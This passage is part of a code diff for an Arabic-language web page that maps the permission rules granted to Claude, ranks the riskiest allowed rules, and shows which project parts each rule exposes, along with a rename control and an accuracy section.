+    if (n.kind === "rule") { PV = { view: "rule", rule: n.rule, sel: null }; }
+    else if (n.kind === "center" && PV.view === "rule") { PV = { view: "top", rule: null, sel: null }; }
+    else { PV.sel = n.id; PV._node = n; }
+    drawPerm(); renderPermPanel();
+    var r = $("permPanel").getBoundingClientRect(); if (r.top > window.innerHeight * 0.75) { try { $("permPanel").scrollIntoView({ behavior: "smooth", block: "start" }); } catch (e) {} }
+  }
+  function openRule(r) { PV = { view: "rule", rule: r, sel: null }; drawPerm(); renderPermPanel(); try { $("permMap").scrollIntoView({ behavior: "smooth", block: "start" }); } catch (e) {} }
+  function renderPermPanel() {
+    var p = $("permPanel"); p.textContent = "";
+    function add(tag, cls, text, parent) { var e = document.createElement(tag); if (cls) e.className = cls; if (text != null) e.textContent = text; (parent || p).appendChild(e); return e; }
+    function ruleRow(r, parent) {
+      var x = add("div", "rule rowbtn r-" + (r.kind === "deny" ? "green" : r.risk), null, parent); x.setAttribute("role", "button"); x.tabIndex = 0;
+      add("b", "", r.plain, x); add("span", "worst", (r.kind === "deny" ? "" : "أسوأ شي بيغطيه: ") + r.worst, x);
+      var m = add("span", "meta", (r.scopeText || "") + " · ", x); add("code", "", r.raw, m);
+      x.addEventListener("click", function () { openRule(r); });
+      x.addEventListener("keydown", function (e) { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); openRule(r); } });
+    }
+    if (!APPR) { add("h2", "", "صلاحيات Claude"); add("p", "safe-line", "ما في موافقات محمّلة بعد."); return; }
+    if (PV.view === "rule") {
+      var r = PV.rule, caps = capsOfRule(r);
+      var back = add("button", "back", "← كل الصلاحيات"); back.type = "button"; back.addEventListener("click", function () { PV = { view: "top", rule: null, sel: null }; drawPerm(); renderPermPanel(); });
+      add("h2", "", shortOf(r));
+      add("p", "sel-desc", r.plain);
+      add("p", "lead", (r.kind === "deny" ? "" : "أسوأ شي بيغطيه: ") + r.worst);
+      add("p", "meta", (r.scopeText || "") + " · " + r.raw);
+      add("h3", "", "شو تفرّع عنها");
+      if (!caps.length) add("p", "safe-line", r.kind === "deny" ? "هاي حماية: Claude ما بيقدر يعمل هالشي." : "ما فيها قدرة خطرة.");
+      caps.forEach(function (cap) {
+        var ks = affectedKids(cap), txt = ks.map(function (k) { return k.label + (k.sub && k.kind !== "unit" && k.kind !== "umore" ? " (" + k.sub + ")" : ""); }).join("، ");
+        add("p", "chain", "[" + CAPLBL[cap] + "] ← " + txt);
+      });
+      if (PV.sel && PV._node) {
+        var n = PV._node;
+        add("h3", "", n.label);
+        if (n.kind === "cap") add("p", "safe-line", CAPEXPL[n.cap] || "");
+        else if (n.kind === "unit") { var c = unitCaps(n.unit), ks2 = Object.keys(c); add("p", "safe-line", unitName(n.unit) + ": " + n.unit.desc); add("p", "safe-line", "قدراته: " + ks2.join(" ") + " (مكشوفة لهالصلاحية)."); }
+        else if (n.kind === "umore") add("p", "safe-line", n.units.map(unitName).join("، "));
+        else if (n.kind === "all") add("p", "safe-line", "الصلاحية بتغطي كل ملفات المشروع، فكل أجزاءه معرّضة.");
+        else add("p", "safe-line", n.label);
+      }
+      return;
+    }
+    add("h2", "", "صلاحيات Claude" + (APPR.label ? " · " + APPR.label : ""));
+    if (APPR.demo) add("p", "demo", "موافقات تجريبية للمثال، مو موافقاتك الحقيقية.");
+    if (APPR.note) add("p", "demo", APPR.note);
+    add("p", "lead", APPR.summary.sentence);
+    var selN = PV._node && PV.sel ? PV._node : null;
+    if (selN && (selN.kind === "cat" || selN.kind === "more")) {
+      add("h3", "", selN.kind === "cat" ? selN.label + " (" + selN.rules.length + ")" : selN.label);
+      add("p", "safe-line", "اضغط على صلاحية لتشوف شو تفرّع منها.");
+      (selN.kind === "cat" ? selN.rules : selN.rules).forEach(function (r) { ruleRow(r, p); });
+    } else {
+      add("h3", "", "الأخطر، اضغط وحدة لتشوف شو تفرّع منها");
+      allRules().filter(function (r) { return r.kind === "allow"; }).sort(function (a, b) { return RISKS[b.risk] - RISKS[a.risk]; }).slice(0, 5).forEach(function (r) { ruleRow(r, p); });
+    }
+    var det = add("details", "", null); add("summary", "", "كل الصلاحيات (" + allRules().length + ")", det);
+    allRules().forEach(function (r) { if (!r.isMode) { var w = add("div", "", null, det); w.style.marginTop = "6px"; ruleRow(r, w); } });
+  }
+  function showTab(which) {
+    HACK = which === "perm";
+    document.body.classList.toggle("hack", HACK);
+    $("tabMap").setAttribute("aria-pressed", String(!HACK)); $("tabAppr").setAttribute("aria-pressed", String(HACK));
+    function setHidden(e, v) { if (v) e.setAttribute("hidden", ""); else e.removeAttribute("hidden"); }
+    setHidden($("map"), HACK); setHidden($("permMap"), !HACK);
+    $("panel").hidden = HACK; $("permPanel").hidden = !HACK; $("proof").hidden = HACK;
+    $("legendMap").hidden = HACK; $("legendHack").hidden = !HACK; $("hackPrompt").hidden = !HACK;
+    $("intro").textContent = HACK ? "خريطة الصلاحيات: بالنص Claude، حواليه الصلاحيات اللي سمحت فيها، واضغط على أي صلاحية لتشوف شو تفرّع منها وأي أجزاء بمشروعك بتتأثر." : MAP_INTRO;
+    if (HACK) { PV = { view: "top", rule: null, sel: null }; drawPerm(); renderPermPanel(); } else { render(); fit(); }
+  }
+  $("tabMap").addEventListener("click", function () { showTab("map"); });
+  $("tabAppr").addEventListener("click", function () { showTab("perm"); });
+
+  $("renameBtn").addEventListener("click", function () {
+    var d = DISP[state.sel], h = $("selName"), inp = document.createElement("input"), finished = false;
+    inp.type = "text"; inp.value = d.name; inp.maxLength = 40; inp.setAttribute("aria-label", "الاسم الجديد");
+    h.textContent = ""; h.appendChild(inp); inp.focus(); inp.select();
+    function done(save) {
+      if (finished) return; finished = true;
+      if (save && inp.value.trim()) { d.name = inp.value.trim(); NM[d.id] = d.name; saveNames(NM); nodeEls[d.id].t.textContent = d.name; fit(); }
+      render();
+    }
+    inp.addEventListener("keydown", function (e) { if (e.key === "Enter") done(true); else if (e.key === "Escape") done(false); });
+    inp.addEventListener("blur", function () { done(true); });
+  });
+
+  // ---- proof section ---------------------------------------------------------------------------------
+  (function proof() {
+    var s = $("proof"); if (!RES) { s.hidden = true; return; }
+    var h = '<h2>كم هالخريطة دقيقة؟</h2>' + RES.html;
+    s.innerHTML = h;
+  })();
+
+  render();
+  if (document.fonts && document.fonts.ready) document.fonts.ready.then(fit);
+})();
+</script>
+</body>
+</html>
